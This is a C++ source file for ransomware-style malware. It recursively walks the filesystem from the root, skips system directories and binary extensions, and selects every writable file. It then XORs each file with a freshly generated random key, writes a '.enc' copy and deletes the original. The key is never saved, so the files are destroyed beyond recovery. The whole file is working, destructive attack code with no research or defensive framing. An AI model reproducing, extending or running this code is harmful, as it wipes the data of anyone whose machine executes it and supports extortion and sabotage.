#include <string>
#include <iostream>
#include <random>
#include <vector>
#include <filesystem>
#include <unistd.h>
#include <fstream>

std::string gen_key(int length);

// files of interst that we want to crypt stored in a vector
std::vector<std::string> files_to_crypt;

bool has_perms(const std::filesystem::path& path) {
    // returns true or false to assert our R permissions, can have other permissions too
    return (access(path.c_str(), R_OK) == 0);
}

void traverse_directories(const std::filesystem::path& root_path) {
    // directories to avoid
    std::vector<std::string> avoid_dirs = {"/boot", "/usr/lib", "/proc", "/usr/sbin", "/usr/bin", "/sbin", "/usr/share", "/bin", "/dev", "/sys", "/run", "/snap"};
    std::vector<std::string> avoid_ext = {".elf", ".so", ".img"};

    try {
        for (auto it = std::filesystem::recursive_directory_iterator(root_path); it != std::filesystem::recursive_directory_iterator(); ++it) {
            try {
                const auto& entry = *it;
                // if we do not have permissions to the path dont recurse down
                if (!has_perms(entry.path())) {
                    it.disable_recursion_pending();
                    continue;
                }
                // if the path is a symlink dont recurse down 
                if (std::filesystem::is_symlink(entry.path())) {
                    it.disable_recursion_pending();
                    continue;
                }
                // if the path is a directory
                if (std::filesystem::is_directory(entry.path())) {
                    // get the full path and store as str
                    std::string full_path = entry.path().string();
                    // init to false 
                    bool is_avoided = false;
                    // loop through the avoid_dirs
                    for (const auto& avoid_dir : avoid_dirs) {
                        // if the file path is a dir to avoid or a child of a dir to avoid
                        if (full_path == avoid_dir || full_path.find(avoid_dir + "/") == 0) {
                            // update to true condition
                            is_avoided = true;
                            break;
                        }
                    }
                    // if it is one to avoid disable recursing down 
                    if (is_avoided) {
                        it.disable_recursion_pending();
                        continue;
                    }
                // if the path is a regular file 
                } 
                else if (std::filesystem::is_regular_file(entry.path())) {
                    std::string fn = entry.path().string();
                    //if (fn.find('.') != std::string::npos) {
                    // check to see if the file has an extension 
                    if (!entry.path().extension().empty()) {
                        bool bad_ext = false;
                        for (const auto& ext : avoid_ext) {
                            if (ext == entry.path().extension()) {
                                bad_ext = true;
                                break;
                            }
                        }
                        // If the file should be avoided, skip it
                        if (bad_ext == false) {
                            FILE *fp = nullptr;
                            const char *c_str = fn.c_str();
                            // attempt to append to the file, if successful means we have write permissions
                            if ((fp = fopen(c_str, "a")) != nullptr) {
                                fclose(fp);
                                // add it to our vector of files to encrypt 
                                files_to_crypt.push_back(fn);
                            }
                        }
                    }
                }
            } catch (const std::filesystem::filesystem_error& e) {
                if (e.code() == std::errc::too_many_symbolic_link_levels || e.code() == std::errc::too_many_links || e.code() == std::errc::permission_denied) {
                    it.disable_recursion_pending();
                    continue;
                }
            }
        }
    } catch (const std::filesystem::filesystem_error& e) {
        if (e.code() == std::errc::permission_denied) {
            return;
        }
    }
}

void xor_and_delete_files() {
    for (const auto& file : files_to_crypt) {
        int length = 20;
        std::string key = gen_key(length);

        // Open the input file for reading in binary mode
        std::ifstream input_file(file, std::ios::binary);
        if (!input_file) {
            continue;
        }

        // Create the output file name with ".enc" extension
        std::string encrypted_file_name = file + ".enc";

        // Open the output file for writing in binary mode
        std::ofstream output_file(encrypted_file_name, std::ios::binary);
        if (!output_file) {
            continue;
        }

        char byte;
        size_t key_index = 0;
        while (input_file.get(byte)) {
            // XOR the byte with the corresponding byte from the key
            byte ^= key[key_index];
            output_file.put(byte);

            // Move to the next character of the key, looping back to the start if necessary
            ++key_index;
            if (key_index >= key.size()) {
                key_index = 0;
            }
        }
        // Close files
        input_file.close();
        output_file.close();

        // Delete the original file
        std::filesystem::remove(file);

    }
}


std::string gen_key(int length) {
    const std::string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, characters.size() - 1);

    std::string key;
    for (int i = 0; i < length; ++i) {
        key += characters[distribution(generator)];
    }
    return key;
}


int main() {
    
    traverse_directories("/");

    xor_and_delete_files();

    return 0;
    
}
